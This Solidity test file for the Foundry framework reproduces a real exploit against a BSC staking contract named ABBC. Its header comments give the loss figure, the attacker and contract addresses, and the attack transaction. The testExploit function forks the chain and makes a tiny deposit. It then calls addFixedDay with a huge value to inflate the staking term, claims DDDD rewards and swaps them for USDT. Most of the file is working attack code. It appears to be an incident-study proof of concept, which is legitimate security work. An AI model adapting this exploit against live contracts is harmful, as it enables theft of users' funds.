// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interfaces/IPancakePair.sol";
import "./interfaces/IPancakeRouter.sol";
import "./interfaces/IEGD_Finance.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/cheat.sol";
import "./constants/bsc.sol";
import {IABBC} from "./interfaces/IABBC.sol";
import "./utils/tokenhelper.sol";
import "./utils/besttest.sol";


interface IMEVBot {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes memory data) external;
}

// @KeyInfo - Total Lost : ~14,000 US$
// Attacker : 0x53FEEe33527819bB793b72bd67dbf0f8466f7d2c
// Attack Contract : 0x90e076eF0fEd49A0b63938987F2caD6B4Cd97a24
// Vulnerable Contract : 0x1bC016C00F8d603c41A582d5Da745905B9D034e5 (Proxy)
// Vulnerable Contract : 0x1bC016C00F8d603c41A582d5Da745905B9D034e5 (Logic)
// Attack Tx : https://bscscan.com/tx/0xee4eae6f70a6894c09fda645fb24ab841e9847a788b1b2e8cb9cc50c1866fb12

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1bC016C00F8d603c41A582d5Da745905B9D034e5#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x1bC016C00F8d603c41A582d5Da745905B9D034e5

// 宣告全局變量, 必須為 constant 類型
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant DDDDPool = 0xB7021120a77d68243097BfdE152289DB6d623407;
address constant ABBC = 0x1bC016C00F8d603c41A582d5Da745905B9D034e5;
address constant DDDD = 0x422cBee1289AAE4422eDD8fF56F6578701Bb2878;
address constant PANCAKE_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
contract Exploit is Test {

}

contract Attacker is Test { // 模擬的攻擊者(EOA)
    address public _token0;
    address public _token1;
    constructor() { // 也可以寫成 function setUp() public {}
        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        cheat.label(BUSD, "BUSD");
        cheat.label(USDT, "USDT");
        cheat.label(WBNB, "WBNB");
        cheat.label(DDDD, "DDDD");
        /* ------------------------------------------------------------------------------------------- */
        vm.rollFork(58615050);
        deal(address(USDT),address(this),100000 ether);
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }

    function testExploit() public { // 必須為 test 開頭命名, 才能被 Foundry 執行 testcase
        // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB Balance", IERC20(WBNB).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", IERC20(BUSD).balanceOf(address(this)), 18);


        IERC20(USDT).approve(address(ABBC),type(uint256).max);
        // deposit 1 USDT for valid daily USDT
        IABBC(ABBC).deposit(125,address(0));
        // 手动计算下全部提款需要fixed day增加多少，避免整型下溢直接revert了
        // 修改fixed day
        IABBC(ABBC).addFixedDay(1e9);

        // claim reward
        IABBC(ABBC).claimDDDD();

         uint256 balance = TokenHelper.getTokenBalance(DDDD, address(this));
         require(balance > 0, "No DDDD tokens received");
         TokenHelper.approveToken(address(DDDD), address(PANCAKE_ROUTER), balance);

         ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({
            path: hex"422cbee1289aae4422edd8ff56f6578701bb28780009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0001f455d398326f99059ff775485246999027b3197955",
            recipient: address(this),
            deadline: block.timestamp + 100,
            amountIn: balance,
            amountOutMinimum: 0
        });
         ISwapRouter(PANCAKE_ROUTER).exactInput(params);

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB Balance", IERC20(WBNB).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", IERC20(BUSD).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker DDDD Balance", IERC20(DDDD).balanceOf(address(this)), 18);
    }

    function token0() public view returns (address) {
        return _token0;
    }
    function token1() public view returns(address )  {
      return _token1;
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) public {}
}


interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external returns (uint256);
}